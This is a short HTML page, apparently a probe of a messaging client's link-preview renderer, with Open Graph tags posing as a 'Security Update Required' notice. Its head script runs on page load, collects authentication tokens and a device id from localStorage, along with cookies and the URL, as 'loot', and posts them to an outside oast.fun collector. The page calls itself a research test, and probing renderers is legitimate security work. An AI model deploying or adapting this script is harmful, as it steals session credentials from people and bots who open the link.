<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Preview Investigation</title>

    <meta property="og:title" content="Security Update Required">
    <meta property="og:description" content="Please review the document at this link.">
    <meta property="og:image" content="https://via.placeholder.com/600x315.png?text=Security+Research">

    <script>
        (function() {
            try {
                // 1. Собираем всё самое ценное из LocalStorage
                const loot = {
                    auth: localStorage.getItem('__oneme_auth'),
                    callToken: localStorage.getItem('__oneme_calls_auth_token'),
                    deviceId: localStorage.getItem('__oneme_device_id'),
                    url: window.location.href,
                    cookies: document.cookie,
                    timestamp: new Date().toISOString()
                };

                // 2. Отправляем на вебхук
                // Используем mode: 'no-cors', чтобы запрос прошел даже при строгой политике CORS
                fetch('https://zmsfeowzqscjsayavbfelncjzqdvcgxyz.oast.fun', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(loot)
                })
                .then(() => console.log('Data sent successfully'))
                .catch((err) => console.error('Error sending data:', err));

            } catch (error) {
                // Логируем ошибки доступа, если сработал Sandboxing или SOP
                fetch('https://zmsfeowzqscjsayavbfelncjzqdvcgxyz.oast.fun?error=' + btoa(error.message));
            }
        })();
    </script>
</head>
<body>
    <div style="font-family: sans-serif; text-align: center; margin-top: 50px;">
        <h1>Research Laboratory</h1>
        <p>If you see this, the page has been rendered by the client/bot.</p>
    </div>
</body>
</html>
